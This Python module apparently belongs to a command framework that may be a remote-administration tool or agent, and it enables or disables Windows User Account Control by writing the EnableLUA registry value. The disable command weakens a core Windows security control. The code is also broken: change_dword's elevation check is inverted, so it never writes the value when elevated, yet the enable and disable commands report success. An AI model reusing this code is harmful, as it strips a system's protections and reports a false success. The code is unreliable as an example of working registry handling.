import ctypes
import os
import platform
from typing import Callable, Dict, Optional

from pydantic import BaseModel
try:
    import winreg
except ImportError:
    winreg = None
from ..commands import ICommandModule, Command, CommandResult

command_arg_map = {
    Command.ENABLE_UAC: None,
    Command.DISABLE_UAC: None,
}

class UAC(ICommandModule):
    def __init__(self) -> None:
        if self.is_elevated() and winreg:
            sub_key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
            self.h = winreg.CreateKeyEx(
                winreg.HKEY_LOCAL_MACHINE, sub_key, reserved = 0, access = winreg.KEY_ALL_ACCESS)
            
    def is_elevated(self) -> bool:
        if platform.system() == "Windows":
            try:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        else:
            return os.geteuid() == 0
        
    def disable(self):
        return self.change_dword(0)

    def enable(self):
        return self.change_dword(1)

    def change_dword(self, arg0):
        if self.is_elevated():
            return True
        winreg.SetValueEx(self.h, "EnableLUA", 0, winreg.REG_DWORD, arg0)
        return False
    
    def enable_uac(self) -> CommandResult:
        if not self.is_elevated():
            return CommandResult(success=False, result="Elevated privileges are required.")
        try:
            self.enable()
            return CommandResult(success=True, result="UAC enabled successfully.")
        except Exception as e:
            return CommandResult(success=False, result=f"Failed to enable UAC: {str(e)}")

    def disable_uac(self) -> CommandResult:
        if not self.is_elevated():
            return CommandResult(success=False, result="Elevated privileges are required.")
        try:
            self.disable()
            return CommandResult(success=True, result="UAC disabled successfully.")
        except Exception as e:
            return CommandResult(success=False, result=f"Failed to disable UAC: {str(e)}")

    def run(self, command: Command, args: Optional[BaseModel] = None) -> CommandResult:
        if platform.system() != "Windows":
            return CommandResult(result="This feature is supported on Windows only.", success=False)
        
        command_func_map: Dict[Command, Callable[[], CommandResult]] = {
            Command.ENABLE_UAC: self.enable_uac,
            Command.DISABLE_UAC: self.disable_uac,
        }
        if command in command_func_map:
            return command_func_map[command]()
        else:
            return CommandResult(success=False, result="Command not found.")